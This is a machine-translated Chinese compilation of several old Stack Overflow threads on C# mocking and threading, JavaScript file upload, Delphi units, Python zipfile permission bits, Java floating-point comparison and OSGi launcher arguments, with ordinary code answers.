如果您只想查看它，请尝试 [https://code.google.com/p/wsdl2html/](https://code.google.com/p/wsdl2html/)。这很简单。

# c# - 我应该创建一个接口并模拟这个类吗

> ID：434620
> 
> 赞同：0
> 
> 时间：2009-01-12T06:39:59.373
> 
> 标签：c#, mocking

我有一个名为 Table 的类：

```
class Table
{
    public string Name
    {
        get
        {
            return this.wrapper.Eval(//some command); 
            //wrapper is pass in by the ctor and is a COM object.
        }
    }
} 
```

在这个类中使用：

```
class Map
{
  public Map MapTable(Table table)
  {
     return new Map(table.Name);
  }
} 
```

我想测试 MapTable 命令，我应该模拟 Table 还是应该模拟 table 对象使用的包装器对象。

我在想这样的事情

```
 Test()
 {
   Mock<ITable> mocktable = new Mock<ITable>(//pass in the wrapper object);
   mocktable.ExpectGet(n => n.Name).Returns("Hello World");

   ITable table = mocktable.object;
   Map mymap = Map.MapTable(table);
 } 
```

那会是正确的吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-12T06:54:25.803

*除了通常没有完美的*测试解决方案这一事实之外，我首先要模拟 COM 对象：应该有一个可用的接口，并且您可能想要测试“高于”它的所有内容。

如果`Table`包含非平凡代码（例如，在`Eval()`; 任何带有条件的内容；或例如使用 a 解析`Culture`），您可能想要模拟它，如您在示例中所示。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-12T06:55:03.010

**是**的，您的示例看起来不错，如果您想测试 Map 对象，您应该模拟 Table 对象。

如果您以相反的方式执行此操作，您将不会测试 Map 构造函数。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-05-21T19:51:28.097

帮助我理解。看起来您只想要表格中的名称，而不是表格本身。在这种情况下，为什么不只传入一个名称并将 Table 排除在外呢？

# c# - 线程停止工作

> ID：434626
> 
> 赞同：3
> 
> 时间：2009-01-12T06:43:57.197
> 
> 标签：c#, multithreading, backgroundworker

我们有一个 C# 应用程序，它连接到 FTP 服务器，下载一些文件，断开连接，并在一定时间后（由用户通过 UI 选择）重新连接并重复该过程。我们使用 BackgroundWorker 实现了这一点，但我们注意到在运行较长时间后，程序停止在 UI 和日志文件中记录其操作。那时，它没有文件可供下载，所以我们上传了一些文件，它恢复了活动，就好像什么都没发生一样。

问题是普通用户无法知道该程序仍在运行，因此我们决定使用我们自己的线程来实现它。我们做了一个更简单的程序，以排除任何其他问题，这个程序只连接到 FTP 并断开连接。它停止显示消息，就像 BackgroundWorker 一样（2 小时后一次，22 小时后一次，没有我们能找到的任何模式，并且在没有其他任何操作的计算机上）。

```
DoFTPWork += new DoFTPWorkDelegate(WriteFTPMessage);

FTPWorkThread = new Thread(new ParameterizedThreadStart(Process));

//seData is the FTP login info
FTPWorkThread.Start(seData); 
```

FTP方法是：

```
private void Process(object seData1)
{
    seData = (SEData)seData1;
    while (!stopped)
    {
        try
        {
            ftp = null;
            ftp = new FTP_Client();

            if (ftp.IsConnected)
            {
                logMessages += DateTime.Now + "\t" + "info" + "\t" + "Ftp disconnected from " + seData.host + "\r\n";
                ftp.Disconnect();
            }

            ftp.Connect(seData.host, 21);
            ftp.Authenticate(seData.userName, seData.password);
            logMessages += DateTime.Now + "\t" + "info" + "\t" + "Ftp connected to " + seData.host + "\r\n";

            error = false;
            logMessages += DateTime.Now + "\t" + "info" + "\t" + "Trying to reconnect in 5 seconds\r\n";
            System.Threading.Thread.Sleep(5000);
            SlaveEventArgs ev = new SlaveEventArgs();
            ev.Message = logMessages;
            txtLog.Invoke(DoFTPWork, ev);
            System.Threading.Thread.Sleep(200);
            logMessages = "";
        }

        catch (Exception ex)
        {
            logMessages = "";
            if (ftp.IsConnected)
            {
                ftp.Disconnect();
            }
            ftp.Dispose();
            logMessages += DateTime.Now + "\t" + "ERR" + "\t" + ex.Message + "\r\n";

            logMessages += DateTime.Now + "\t" + "info" + "\t" + "Trying to reconnect in 5 seconds\r\n";
            SlaveEventArgs ev = new SlaveEventArgs();
            ev.Message = logMessages;
            txtLog.Invoke(DoFTPWork, ev);
            System.Threading.Thread.Sleep(5 * 1000);
            error = true;
        }
    }
} 
```

WriteFTPMessage 在 TextBox 中显示消息，并在原始程序中写入 .txt 文件。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-01-12T07:33:15.927

如果我理解正确，这个`while(!stopped)`循环是运行了几个小时的循环？如果是这种情况，如果在任何地方，您在哪里终止您的 ftp 连接？您在发布的代码中关闭它的唯一时间是抛出异常，否则您只需取消引用该对象并创建一个新的对象，这是一个非常严重的资源泄漏，如果不引起问题，至少会导致问题。

此外，似乎 ftp 是全球可访问的。您是否使用不同的线程在任何地方访问它？对象线程安全吗？

**编辑：**

我在这里看到的最大问题是设计。并不是说我要包庇你或其他任何东西，而是你已经混合了各种操作。线程、日志记录和 ftp 访问代码都在同一个函数中。

我建议的是重组你的程序。创建一个类似于以下的方法：

```
// Called by thread
void MyThreadOperation()
{
   while(!stopped)
   {
      // This is poor design in terms of performance.
      // Consider using a ResetEvent instead.
      Thread.Sleep(5000);

      try
      {
         doFTPDownload();
      }
      catch(Exception ex)
      {
         logMessage(ex.ToString());
      }
   }
} 
```

`doFTPDownload()`应该是自给自足的。FTP 对象应该在被调用时在函数内部创建和打开，在它完成之前它应该被关闭。同样的概念也应该适用`logMessage()`。我还建议使用数据库而不是文件来存储日志消息，这样锁定问题就不会使事情复杂化。

我知道这不是一个答案，因为您可能仍然会遇到问题，因为我无法确定可能是什么原因。但是，我相信通过一些设计重组，您将能够更好地找到问题的根源。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-01-12T07:34:18.860

我建议将任何可能出错的内容放在 catch 块中（特别是与 FTP 服务器断开连接的位）放在它自己的 try/catch 块中。此外，在您发现异常后立即记录一些内容，然后再执行其他任何操作 - 这样您就更有可能判断日志记录是否由于某种原因在中途死亡。

此外，在 while 循环的末尾添加一条日志消息，以便您可以判断它是否“正常”完成。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-12T07:48:08.830

我建议在问题重现时使用 adplus 并让自己陷入挂起转储。在 Windbg 和 SoS 中进行分析。

是在 Winforms 应用程序中吗？也许 ISynchronizeInvoke 实现挂起。这是作为交互式用户运行的吗？

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-12T07:54:15.463

Rupert：我在 catch 块之后添加了 ftp.Disconnect() 并再次启动它。我检查了原始应用程序，并且在重新连接之前我们断开了连接，所以虽然它会影响问题，但我不认为它会导致它。没有其他线程访问它，所以那里没有问题。

乔恩：我会的，谢谢你的建议。

JD：这是一个Windows应用程序，在选择延迟和FTP连接数据后，用户没有输入任何内容。我会调查 ISynchronizeInvoke

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-01-12T08:33:51.047

我认为您必须努力使其更加线程安全。您有很多共享字段：`ftp, logMessages, error`.

例如这部分：

```
 ev.Message = logMessages;
        txtLog.Invoke(DoFTPWork, ev);
        System.Threading.Thread.Sleep(200);
        logMessages = ""; 
```

在我看来，你正试图通过睡觉和交叉手指来解决多线程问题，你睡得够多了......

您可以通过以下方式解决此问题：

```
 ev.Message = logMessages.Clone();
        txtLog.Invoke(DoFTPWork, ev); 
```

或使用不同的沟通方式。

[您可以使用ManualResetEvent](http://msdn.microsoft.com/en-us/library/system.threading.manualresetevent.aspx)代替停止的布尔值，这是一种线程安全的通信方法。对于错误，您可以使用相同的或信号量。

ManualResetEvent 的好处是您可以使用它来休眠您的线程，而无需完全锁定它。如果我没记错的话，在线程休眠时停止线程的唯一方法是调用 thread.Abort。如果您使用 ManualResetEvent，您可以执行以下操作：

```
if (!shouldStop.WaitOne(5000))
{
    // do thread stuff
}
else
{
    // do cleanup stuff and exit thread.
} 
```

好消息是，你会说我想知道事件是否已发出信号，但我会等待 5 秒钟让它发出信号，否则我会继续未发出信号。

因此，如果您的应用程序决定在睡眠 3 秒后退出，它可以执行 shouldStop.Set() 并且线程将停止。线程仍然有可能正在与 ftp 服务器通信，所以在设置之后你应该执行一个 thread.Join() 来等待它退出。

我并不是说您的问题与我的建议有关，如果不是，我只是想帮助减少可能的原因。

# javascript - 用Javascript上传文件？

> ID：434631
> 
> 赞同：1
> 
> 时间：2009-01-12T06:46:42.217
> 
> 标签：javascript

有谁知道如何在javascript中制作文件上传控件。例如，一个使用 texbox 和一个按钮。

* * *

**Javascript** [文件上传的欺骗](https://stackoverflow.com/questions/408735/javascript-file-uploads)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-12T06:48:39.607

纯 HTML：

```
<input type="file" /> 
```

使用 javascript 以编程方式创建一个：

```
var el = document.createElement('input');
el.type = 'file';
document.body.appendChild(el); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-12T07:19:37.080

如果基于此主题和您之前的主题我的理解是正确的，那么您正在尝试纯用 javascript 上传文件。如果是这种情况，请注意这是不可能的。您将需要在服务器端获取请求。但是，现在，如果您正在寻找以“ajax”方式上传的内容，可以通过隐藏的 iframe 发送请求来解决此问题。我知道 JQuery 内置了这个功能。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-12T07:04:00.933

如果您需要它来打开一个对话框（或者如果您需要能够选择多个文件），您需要使用类似[SWFUpload](http://swfupload.org/)的东西。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-12T07:22:47.617

使用纯 javascript 并且不使用 fileinput html 标签是不可能完成您的任务的，因为它是唯一允许您选择/上传文件的东西。你只能设计它。

另一种方法，正如女高音所建议的，是使用一些基于 Flash/Java 的上传器。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2009-01-12T12:00:08.947

尽管问题的作者询问了表单文件输入样式，但我想让您知道，使用 FireFox 3 及更高版本可以实现纯 JavaScript、AJAX 样式的上传。

[我在我的博客](http://igstan.blogspot.com/2009/01/pure-javascript-file-upload.html)上写了一篇关于这个新功能的详尽教程。

# delphi - Delphi中的全局变量

> ID：434636
> 
> 赞同：1
> 
> 时间：2009-01-12T06:48:28.640
> 
> 标签：delphi, global-variables

我有一个用 Delphi 编写的控制台应用程序。我看到我可以通过将全局变量分配给单元范围来获得全局变量，但是在控制台应用程序中我不使用单元（据我所知，它只是表单）。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2009-01-12T06:54:21.437

不，单位不等于表格。

单元是包含程序的一部分的模块。每个表格都是一个单独的单元，但一个单元不必包含一个表格。

每个单元都有一个接口部分和一个实现部分。接口部分中的声明对使用该单元的所有单元都是可见的：

```
unit A;

interface

  type
    TMyClass = class
    end;

implementation

end.

unit B;

interface

uses
  A;  // I can now see and use TMyClass. 
```

您可以通过在一个单元中声明全局变量来声明它们：

```
unit A;

interface

  var
    GVar1 : Integer;

implementation

  var 
    GVar2 : Integer;

end. 
```

GVar1 是可见的，可以被所有使用单元 A 的单元修改。GVar2 只有单元 A 的代码可见，因为它是在实现部分中定义的。

我强烈建议不要在接口部分使用全局变量，因为您无法控制它们（因为任何人都可以更改它们）。如果你真的需要一个全局的，你最好在实现部分定义它并提供访问函数。

顺便说一句，您可以将单元视为一种类（具有单个实例）。它甚至有一种构造和破坏的方法：

```
unit A;

interface

  type
    TMyClass = class
    end;

implementation

initialization
  // Initialize the unit
finalization
  // Free resources etc. You can olny have a finalization if you have an initialization.
end. 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-12T06:58:16.280

如果你想要全局变量在你的单元的接口部分声明它。

PS 控制台应用程序可以使用单位。

PPS 花点时间阅读 Delphi 文档，它很好地解释了 Delphi 语言。

# python - 如何使用 Python 的 zipfile 模块对 ZIP 文件中的文件设置权限（属性）？

> ID：434641
> 
> 赞同：45
> 
> 时间：2009-01-12T06:51:27.260
> 
> 标签：python, attributes, zip, file-permissions, zipfile

当我从使用 Python 模块创建的 ZIP 文件中提取文件时[`zipfile`](http://docs.python.org/library/zipfile.html)，所有文件都不可写、只读等。

该文件是在 Linux 和 Python 2.5.2 下创建和提取的。

据我所知，我需要`ZipInfo.external_attr`为每个文件设置属性，但这似乎没有记录在我能找到的任何地方，谁能启发我？

* * *

## 回答 #1

> 赞同：48
> 
> 时间：2009-01-12T07:14:46.667

这似乎可行（感谢 Evan，将其放在这里，以便该行符合上下文）：

```
buffer = "path/filename.zip"  # zip filename to write (or file-like object)
name = "folder/data.txt"      # name of file inside zip 
bytes = "blah blah blah"      # contents of file inside zip

zip = zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED)
info = zipfile.ZipInfo(name)
info.external_attr = 0777 << 16L # give full access to included file
zip.writestr(info, bytes)
zip.close() 
```

我仍然希望看到记录此内容的内容...我发现的另一个资源是有关 Zip 文件格式的注释：[http ://www.pkware.com/documents/casestudies/APPNOTE.TXT](http://www.pkware.com/documents/casestudies/APPNOTE.TXT)

* * *

## 回答 #2

> 赞同：26
> 
> 时间：2011-06-09T19:00:35.897

[这个链接](http://trac.edgewall.org/attachment/ticket/8919/ZipDownload.patch)比我在网上找到的任何其他信息都多。即使是 zip 源也没有任何内容。为后代复制相关部分。这个补丁并不是真的要记录这种格式，它只是为了显示当前文档是多么可悲（阅读不存在）。

```
# external_attr is 4 bytes in size. The high order two
# bytes represent UNIX permission and file type bits,
# while the low order two contain MS-DOS FAT file
# attributes, most notably bit 4 marking directories.
if node.isfile:
    zipinfo.compress_type = ZIP_DEFLATED
    zipinfo.external_attr = 0644 << 16L # permissions -r-wr--r--
    data = node.get_content().read()
    properties = node.get_properties()
    if 'svn:special' in properties and \
           data.startswith('link '):
        data = data[5:]
        zipinfo.external_attr |= 0120000 << 16L # symlink file type
        zipinfo.compress_type = ZIP_STORED
    if 'svn:executable' in properties:
        zipinfo.external_attr |= 0755 << 16L # -rwxr-xr-x
    zipfile.writestr(zipinfo, data)
elif node.isdir and path:
    if not zipinfo.filename.endswith('/'):
        zipinfo.filename += '/'
    zipinfo.compress_type = ZIP_STORED
    zipinfo.external_attr = 040755 << 16L # permissions drwxr-xr-x
    zipinfo.external_attr |= 0x10 # MS-DOS directory flag
    zipfile.writestr(zipinfo, '') 
```

此外，[此链接](http://www.pkware.com/documents/casestudies/APPNOTE.TXT)具有以下内容。这里的低位字节大概是指四个字节中最右边（最低）的字节。所以这个是用于 MS-DOS 的，否则可能会保留为零。

> 外部文件属性：（4字节）
> 
> ```
>  The mapping of the external attributes is
>       host-system dependent (see 'version made by').  For
>       MS-DOS, the low order byte is the MS-DOS directory
>       attribute byte.  If input came from standard input, this
>       field is set to zero. 
> ```

[此外，从Debian 档案](http://packages.debian.org/source/stable/zip)库下载的 InfoZIP zip 程序的源代码中的源文件 unix/unix.c 在注释中包含以下内容。

```
 /* lower-middle external-attribute byte (unused until now):
   *   high bit        => (have GMT mod/acc times) >>> NO LONGER USED! <<<
   *   second-high bit => have Unix UID/GID info
   * NOTE: The high bit was NEVER used in any official Info-ZIP release,
   *       but its future use should be avoided (if possible), since it
   *       was used as "GMT mod/acc times local extra field" flags in Zip beta
   *       versions 2.0j up to 2.0v, for about 1.5 years.
   */ 
```

所以把所有这些放在一起，看起来实际上只使用了第二高的字节，至少对于 Unix 来说是这样。

[编辑：我在“压缩格式的外部文件属性](https://unix.stackexchange.com/questions/14705/the-zip-formats-external-file-attribute)”问题中询问了 Unix.SX 上的 Unix 方面。看起来我有几件事错了。具体来说，前两个字节都用于 Unix。

* * *

## 回答 #3

> 赞同：15
> 
> 时间：2009-01-12T06:57:36.390

看这个：[Set permissions on acompressed file in python](https://stackoverflow.com/questions/279945/set-permissions-on-a-compressed-file-in-python)

我不完全确定这是否是您想要的，但似乎是。

关键线似乎是：

```
zi.external_attr = 0777 << 16L 
```

看起来它在`0777`那里设置了权限。

* * *

## 回答 #4

> 赞同：9
> 
> 时间：2018-01-25T04:03:35.403

较早的答案对我不起作用（在 OS X 10.12 上）。我发现除了可执行标志（八进制 755）之外，我还需要设置“常规文件”标志（八进制 100000）。我发现这里提到了这个：[https ://unix.stackexchange.com/questions/14705/the-zip-formats-external-file-attribute](https://unix.stackexchange.com/questions/14705/the-zip-formats-external-file-attribute)

一个完整的例子：

```
zipname = "test.zip"
filename = "test-executable"

zip = zipfile.ZipFile(zipname, 'w', zipfile.ZIP_DEFLATED)

f = open(filename, 'r')
bytes = f.read()
f.close()

info = zipfile.ZipInfo(filename)
info.date_time = time.localtime()
info.external_attr = 0100755 << 16L

zip.writestr(info, bytes, zipfile.ZIP_DEFLATED)

zip.close() 
```

我的特定用例的完整示例，创建 .app 的 zip 以便文件夹中的所有内容`Contents/MacOS/`都是可执行的：[https ://gist.github.com/Draknek/3ce889860cea4f59838386a79cc11a85](https://gist.github.com/Draknek/3ce889860cea4f59838386a79cc11a85)

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2018-12-12T11:37:47.620

您可以扩展`ZipFile`类以更改默认文件权限：

```
from zipfile import ZipFile, ZipInfo
import time

class PermissiveZipFile(ZipFile):
    def writestr(self, zinfo_or_arcname, data, compress_type=None):
        if not isinstance(zinfo_or_arcname, ZipInfo):
            zinfo = ZipInfo(filename=zinfo_or_arcname,
                            date_time=time.localtime(time.time())[:6])

            zinfo.compress_type = self.compression
            if zinfo.filename[-1] == '/':
                zinfo.external_attr = 0o40775 << 16   # drwxrwxr-x
                zinfo.external_attr |= 0x10           # MS-DOS directory flag
            else:
                zinfo.external_attr = 0o664 << 16     # ?rw-rw-r--
        else:
            zinfo = zinfo_or_arcname

        super(PermissiveZipFile, self).writestr(zinfo, data, compress_type) 
```

此示例将默认文件权限更改为`664`并保留`775`为目录。

相关代码：

*   [`ZipFile.writestr`, 蟒蛇 2.7](https://github.com/python/cpython/blob/2.7/Lib/zipfile.py#L1231)
*   [`ZipFile.writestr`, 蟒蛇 3.6](https://github.com/python/cpython/blob/3.6/Lib/zipfile.py#L1648)

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2018-10-26T11:52:31.057

还要看看[Python 的 zipfile 模块](https://svn.python.org/projects/python/trunk/Lib/zipfile.py)做了什么：

```
def write(self, filename, arcname=None, compress_type=None):
    ...
    st = os.stat(filename)
    ...
    zinfo = ZipInfo(arcname, date_time)
    zinfo.external_attr = (st[0] & 0xFFFF) << 16L      # Unix attributes
    ... 
```

```

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2021-01-21T19:28:57.253

要使用 Python 的 zipfile 模块对 ZIP 文件中的文件设置权限（Unix 属性），请将属性作为 ZipInfo 的 external_attr 的第 16-31 位传递。

Python zipfile 模块在 external_attr 位中接受 Unix 的 ASi 额外块的 16 位“模式”字段（存储来自 struct stat 的 st_mode 字段，包含用户/组/其他权限、setuid/setgid 和符号链接信息等）上面提到的。

您还可以导入 Python 的“stat”模块来获取模式常量定义。

您也可以在 create_system 中设置 3 来指定创建 ZIP 存档的操作系统：3 = Unix；0 = 窗户。

这是一个例子：

```
#!/usr/bin/python

import stat
import zipfile

def create_zip_with_symlink(output_zip_filename, link_source, link_target):
    zipInfo  = zipfile.ZipInfo(link_source)
    zipInfo.create_system = 3 
    unix_st_mode = stat.S_IFLNK | stat.S_IRUSR | stat.S_IWUSR | stat.S_IXUSR | stat.S_IRGRP | stat.S_IWGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IWOTH | stat.S_IXOTH
    zipInfo.external_attr = unix_st_mode << 16 
    zipOut = zipfile.ZipFile(output_zip_filename, 'w', compression=zipfile.ZIP_DEFLATED)
    zipOut.writestr(zipInfo, link_target)
    zipOut.close()

create_zip_with_symlink('cpuinfo.zip', 'cpuinfo.txt', '/proc/cpuinfo') 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-01-12T07:15:11.940

当你这样做时，它工作正常吗？

```
zf = zipfile.ZipFile("something.zip")
for name in zf.namelist():
    f = open(name, 'wb')
    f.write(self.read(name))
    f.close() 
```

如果没有，我建议在`os.chmod`for 循环中添加一个 0777 权限，如下所示：

```
zf = zipfile.ZipFile("something.zip")
for name in zf.namelist():
    f = open(name, 'wb')
    f.write(self.read(name))
    f.close()
    os.chmod(name, 0777) 
```

# java - Java：双值比较

> ID：434657
> 
> 赞同：23
> 
> 时间：2009-01-12T06:59:33.313
> 
> 标签：java, double

将双精度值与零进行比较时，我们需要小心吗？

```
if ( someAmount <= 0){
.....
} 
```

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2009-01-12T08:13:34.363

如果你想非常小心，你可以测试它是否在零的某个 epsilon 之内，比如

```
double epsilon = 0.0000001;
if      ( f <= ( 0 - epsilon ) ) { .. }
else if ( f >= ( 0 + epsilon ) ) { .. }
else { /* f "equals" zero */ } 
```

或者你可以简单地将你的双打四舍五入到某个指定的精度，然后再对它们进行分支。

有关比较浮点数误差的一些有趣细节，请参阅[Bruce Dawson 的一篇文章](http://www.cygnus-software.com/papers/comparingfloats/comparingfloats.htm)。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2009-01-12T18:15:48.050

对于平等：（即`==`或`!=`）是。

对于其他比较运算符（`<`, `>`, `<=`, `>=`），这取决于您是否在边缘情况下，例如是否`<`等价于`<=`，这是另一种相等的情况。如果您不关心边缘情况，这通常无关紧要，尽管这取决于您的输入数字来自何处以及如何使用它们。

如果您期望`(3.0/10.0) <= 0.3`评估为`true`（如果浮点错误导致 3.0/10.0 评估为略大于 0.3 的数字，例如 0.300000000001，则可能不会），并且如果评估为`false`- 这是一个边缘情况，您的程序将表现不佳，并且你需要小心。

好的数值算法几乎不应该依赖于等式和边缘情况。如果我有一个算法将 ' ' 作为输入，`x`它是 0 到 1 之间的任意数字，一般来说，`0 < x < 1`或`0 <= x <= 1`. 但也有例外：在评估具有分支点或奇点的函数时必须小心。

如果我有一个中间量`y`并且我期待`y >= 0`并且我评估`sqrt(y)`，那么我必须确定浮点错误不会导致 y 是一个非常小的负数并且`sqrt()`函数会引发错误。（假设这是不涉及复数的情况。）如果我不确定数字错误，我可能会`sqrt(max(y,0))`改为评估。

对于`1/y`or之类的表达式`log(y)`，在实际意义上，y 是否为零（在这种情况下会出现奇点错误）或 y 是非常接近于零的数字（在这种情况下会得到一个非常大的数字）并不重要，其大小对 y 的值非常敏感）——从数值的角度来看，这两种情况都是“坏的”，我需要重新评估我正在尝试做什么，以及我在寻找什么行为时值`y`是在零附近。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2009-01-12T07:21:09.680

根据您`someAmount`的计算方式，您可能会期望浮点/双精度出现一些奇怪的行为

基本上，使用浮点数/双精度数将数字数据转换为二进制表示容易出错，因为有些数字不能用螳螂/指数表示。

有关这方面的一些详细信息，您可以阅读[这篇小文章](http://mindprod.com/jgloss/floatingpoint.html)

您应该考虑使用`java.lang.Math.signum`or `java.math.BigDecimal`，尤其是用于货币和税收计算

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2009-01-12T09:30:09.297

注意自动拆箱：

```
Double someAmount = null;
if ( someAmount <= 0){ 
```

繁荣，NullPointerException。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2018-02-07T16:24:40.347

> 是的，你应该小心。

建议：一种好方法是`BigDecimal`用于将相等/不相等检查为 0：

```
BigDecimal balance = pojo.getBalance();//get your BigDecimal obj

0 != balance.compareTo(BigDecimal.ZERO) 
```

> 解释 ：

该`compareTo()`函数将 this`BigDecimal`与指定的`BigDecimal`. 此方法认为两个`BigDecimal`值相等但比例不同的对象（如 2.0 和 2.00）是相等的。此方法优先于六个`boolean`比较运算符中的每一个的单独方法提供`(<, ==, >, >=, !=, <=)`。执行这些比较的建议习惯用法是：`(x.compareTo(y) <op> 0)`，其中 是六个比较运算符之一。

*（感谢 SonarQube 文档）*

浮点数学是不精确的，因为将这些值存储在二进制表示中存在挑战。更糟糕的是，浮点数学不是关联的；通过一系列简单的数学运算推动浮点数或双精度数，由于每一步都会发生舍入，答案将根据这些运算的顺序而有所不同。

即使是简单的浮点赋值也不简单：

```
float f = 0.1; // 0.100000001490116119384765625
double d = 0.1; // 0.1000000000000000055511151231257827021181583404541015625 
```

（结果会因编译器和编译器设置而异）；

因此，在 float 或 double 值上使用等式 (==) 和不等式 (!=) 运算符几乎总是错误的。相反，最好的做法是完全避免浮点比较。如果不可能，您应该考虑使用 Java 的浮点处理数字之一，例如 BigDecimal，它可以正确处理浮点比较。第三种选择不是寻找相等性，而是寻找值是否足够接近。即将存储值和预期值之间的差值的绝对值与可接受的误差范围进行比较。请注意，这并不涵盖所有情况（例如 NaN 和 Infinity）。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-11-01T18:56:12.443

如果您不关心边缘情况，那么只需测试`someAmount <= 0`. 它使代码的意图清晰。如果您确实关心，那么...这取决于您如何计算`someAmount`以及为什么要测试不等式。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2016-05-03T08:20:30.250

检查 double 或 float 值是否为 0，错误阈值用于检测该值是否接近 0，但不完全为 0。我认为这种方法是我遇到的最好的方法。

> [如何测试双精度数是否为零？](https://stackoverflow.com/questions/18260213/how-to-test-if-a-double-is-zero) 由@William Morrison 回答

```
public boolean isZero(double value, double threshold){
  return value >= -threshold && value <= threshold;
} 
```

例如，将阈值设置为 0。像这样，

```
System.out.println(isZero(0.00, 0));
System.out.println(isZero(0, 0));
System.out.println(isZero(0.00001, 0)); 
```

上述示例代码的结果为真、真和假。

玩得开心 @。@

# winforms - 文本框撤消/重做命令

> ID：434658
> 
> 赞同：5
> 
> 时间：2009-01-12T06:59:37.477
> 
> 标签：winforms

WinForms 文本框有一个“撤消”命令，但没有“重做”命令 - 为什么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-01-12T13:30:47.423

因为作为 T​​extBox 基础的本机 Windows 编辑控件具有 WM_UNDO 但没有 WM_REDO。它有很多怪癖，可以追溯到 Windows 1.0 和大量的应用程序兼容补丁。

# java - 从 OSGi 包访问命令行参数

> ID：434664
> 
> 赞同：7
> 
> 时间：2009-01-12T07:03:47.157
> 
> 标签：java, command-line, osgi, apache-felix

我有一个作为 OSGi 包集合运行的应用程序。我使用嵌入 Felix 框架的非常小的包装器来启动它。这个包装器的必要性让我有点恼火，因为它依赖于 Felix（而应用程序本身也可以在 Equinox 中运行），所以我想摆脱它，并使用默认的 Felix发射器。

包装器真正做的唯一一件事就是将命令行参数传递给启动的 OSGi 框架，以便那里的包可以对它们做出反应。请注意，它实际上并不解析参数，只是将 String[] 推送到我的应用程序中。

是否有标准方式（或至少是 Felix 标准方式）从包中访问命令行参数，以便我可以取消自定义启动器？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-30T07:50:16.267

如果你使用 bnd(tools)，你可以使用它的启动器。它将命令行参数注册为服务属性“launcher.arguments”。

当您将它与 bnd package 命令结合使用时，它的效果非常好。此命令采用描述运行环境（包、属性、框架）的 bnd 项目或 bndrun 文件并变成独立的主 jar。因此，您在 bndtools 中进行开发和调试，当您满意时，您可以将其转换为单个可执行 jar。例子：

```
@Component
public class MyApp {
   String[] args;

   @Activate
   void activate() { 
      System.out.println("Args: " + Arrays.toString(args));
   }

   @Reference(target="(launcher.arguments=*)")
   void args( Object object, Map<String,Object> map) {
       args = (String[]) map.get("launcher.arguments");
   }
} 
```

变成可执行文件：

```
bnd package myapp.bnd
java -jar myapp.jar -a somearg *.file 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-05-20T14:20:49.770

Late answer but perhaps someone finds it useful.

I was having quite the same issue. My application runs in OSGi but I have external interfaces that I need to comply with which implies reading the command line arguments.

The key to this is something defined in the new OSGi specification 4.2, namely Framework Launching. You can read about it in the Draft spec (found under Draft on www.osgi.org) in the Life Cycle Layer section.

It's a standard way of launching an OSGi framework (any implementation that supports OSGi 4.2) from a stand-alone java application. The nifty thing is that you don't need to know which implementation you start (Felix, Equinox, ...) as long as it is found in the CLASSPATH.

This way, the your launcher application reads command line arguments, instantiates and starts an OSGi framework and pass the arguments to your bundle (any way you want). What you get in the launcher application is a Context to the framework from which you can communicate with your bundles.

As of Equinox 3.5M6 (I think, well at least M6) this is supported. The latest version of Apache Felix does also support this.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-05T01:16:20.547

我知道您只搜索了 Felix。那么，这个 Equinox-only 解决方案可能没有用。我把它留在这里，因为其他人可能会偶然发现这个问题并让 Equinox 运行。

从任何捆绑包和任何框架中，这可能都很困难。如果您使用 org.eclipse.core.runtime.applications 扩展点，应该很容易。前提条件：您不要将 -console 作为参数传递。

```
public class Application implements IApplication {

    @Override
    public Object start(IApplicationContext context) throws Exception {
        String[] args = (String[])context.getArguments().get("application.args");
        // args.length == 0 if no arguments have been passed
    }
} 
```

plugin.xml 中的引用

```
 <plugin>
    <extension
          id="myApp"
          point="org.eclipse.core.runtime.applications">
        <application>
          <run class="package.Application" />
        </application>  
    </extension>
 </plugin> 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-01-19T14:50:08.793

可能不是。我认为标准的 Felix 启动器会进行一些命令行验证，并且只接受捆绑缓存目录作为参数。不止一个参数，启动器退出。

您可以使用系统属性在命令行中传递信息，我认为它不仅适用于 felix，还适用于其他 osgi 容器，但它可能会使您的应用程序对用户不太友好。

# c# - IEnumerable 接口

> ID：434666
> 
> 赞同：4
> 
> 时间：2009-01-12T07:04:04.987
> 
> 标签：c#, inheritance, ienumerable

我不明白为什么`IList`实施`IEnumerable`考虑到`IList`实施`ICollection`也实施`IEnumerable`。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2009-01-12T07:20:34.940

我假设您想知道为什么它声明它实现`ICollection`以及`IEnumerable`，当第一个暗示第二个时。我怀疑主要原因是清晰：这意味着人们不需要回头`ICollection`检查它是否已经延伸`IEnumerable`。

有时您需要重新声明接口实现，如果您想重新实现以前在基类中显式实现的接口方法 - 但我认为这不是这种情况下的原因。

